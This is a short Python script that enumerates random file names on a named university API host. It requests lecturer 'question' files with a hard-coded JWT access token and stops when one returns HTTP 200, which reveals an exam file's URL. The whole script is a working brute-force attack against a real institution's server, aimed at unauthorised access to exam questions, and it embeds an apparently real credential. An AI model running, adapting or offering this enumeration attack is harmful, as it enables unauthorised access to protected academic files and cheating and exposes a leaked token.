import os
import requests
import random
import time
from colorama import Fore
os.system('cls')

code = input (Fore.GREEN+'code : ')
date = input (Fore.GREEN+'date : ')
file_format = input (Fore.GREEN+'file format : ')
token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJNZW1iZXJJRCI6NjM4OCwiTWVtYmVyVHlwZUlEIjoxLCJSZXF1ZXN0VHlwZSI6ImdlbmVyYWwiLCJGaWxlTmFtZSI6ImxlY3R1cmVyXzU3X19yZXNvdXJjZV8wX18xNDAwMDYyMl8xNTI0MTAucGRmIiwiaWF0IjoxNjMzOTU0NDczLCJleHAiOjE2MzM5NTgwNzN9.-vpg2SQRz9A9_S6VjIMdDsfq45KJiyZAFjqLDiQ0Xmk'
file_names = []
counter = 0
while True :
	name = str(random.randint(140000, 150000))
	url = 'https://yaraapi.mazust.ac.ir/static/questions/lecturer_'+code+'__question_0__'+date+'_'+name+'.'+file_format+'?token='+token
	if (name not in file_names):
		counter = counter + 1
		print (Fore.YELLOW+'['+Fore.RED+'!'+Fore.YELLOW+']'+Fore.BLUE+'trying...'+Fore.RED+'('+(str(counter))+')')
		req = requests.get(url)
		file_names.append(name)
		if (req.status_code == 200):
			print (Fore.GREEN+url)
			break


input ('\n\nPress Any Key To Continue')
